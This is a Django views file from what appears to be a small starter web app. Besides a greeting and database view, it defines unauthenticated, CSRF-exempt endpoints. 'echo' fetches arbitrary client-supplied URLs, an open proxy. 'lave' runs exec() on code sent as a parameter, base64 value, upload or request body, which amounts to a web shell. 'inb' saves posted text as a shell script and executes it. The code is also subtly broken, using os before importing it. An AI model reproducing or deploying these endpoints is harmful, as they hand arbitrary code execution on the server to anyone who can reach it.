from django.shortcuts import render
from django.http import HttpResponse

from .models import Greeting
from django.views.decorators.csrf import csrf_exempt
# Create your views here.
# def index(request):
#     # return HttpResponse('Hello from Python!')
#     return render(request, 'index.html')
import requests
def index(request):
	r = requests.get('http://httpbin.org/status/418')
	print(r.text)
	return HttpResponse('<pre>' + r.text + '</pre>')

@csrf_exempt
def echo(r):
	g = r.POST or r.GET
	u = g.get('u')
	if u:
		a = g.get('a')
		t = g.get('t')
		if a:
			b = g.get('b')
			r = requests.get(u, headers={'Range': 'bytes=%s-%s' % (a, b)})
		else:
			r = requests.get(u)
		return HttpResponse(r, content_type=(t or 'image/png'))
	u = g.get('h')
	if u:
		r = requests.head(u, allow_redirects=True)
		h = r.headers
		if not h:
			return HttpResponse('<pre>No headers</pre>')
		u = "\n".join(["%s: %s" % (k, h[k]) for k in h])
		t = g.get('t')
		if t and t.startswith("text/"):
			return HttpResponse(u)
		return HttpResponse('<pre>\n' + u + '\n</pre>')
	return HttpResponse('<pre>No URL</pre>')

@csrf_exempt
def lave(request):
	aux = {}
	while True:
		data = request.FILES
		if data:
			data = data.get('eval')
			if data:
				data = data.read().decode("UTF-8")
				break
		REQ = request.POST or request.GET
		if REQ:
			data = REQ.get('from', False)
			if data:
				open("mail.txt", "w").write(repr(REQ))
				return HttpResponse("OK")
			data = REQ.get('eval', False)
			if data:
				break
			data = REQ.get('enc', False)
			if data:
				from base64 import b64decode
				data = b64decode(data)
				break
		data = request.body.decode("UTF-8")
		break
	exec(data)
	return aux['main'](request)

@csrf_exempt
def inb(request):
	req = request.POST
	from pprint import pformat
	open("mail.txt", "w").write(pformat(req))
	try:
		data = req.get("plain")
		if data:
			###
			from json import dump
			from tempfile import NamedTemporaryFile
			#json = NamedTemporaryFile(suffix='.json', delete=False)
			json = open("mail.json", "wb")
			dump(req, json)
			json.close()
			###
			from re import compile
			prre = compile("^(\s*#\s*!\s*)([^\s+]+)")
			data = data.strip()
			m = prre.search(data)
			while m:
				m = m.group(2)
				if os.path.exists(m):
					break
				from subprocess import check_output
				import os
				m = check_output(["which", m], shell=True)
				if m and os.path.exists(m):
					data = prre.sub(lambda g: g.group(1) + m, data)
				break
			###
			#scrp = NamedTemporaryFile(delete=False)
			scrp = open("mail.sh", "wb")
			scrp.write(data.encode("UTF-8"))
			scrp.close()
			###
			#cmd = [scrp.name, json.name]
			cmd = ["mail.sh", "mail.json"]
			if cmd:
				from subprocess import Popen, PIPE, STDOUT
				return HttpResponse(str(Popen(cmd, stdout=PIPE, stderr=STDOUT, shell=True).pid))
	except:
		from sys import exc_info
		ex = exc_info()
		open("mail.log", "w").write(str(ex[1]))
		return HttpResponse(str(ex[1]))
	return HttpResponse("OK")

def db(request):

	greeting = Greeting()
	greeting.save()

	greetings = Greeting.objects.all()

	return render(request, 'db.html', {'greetings': greetings})

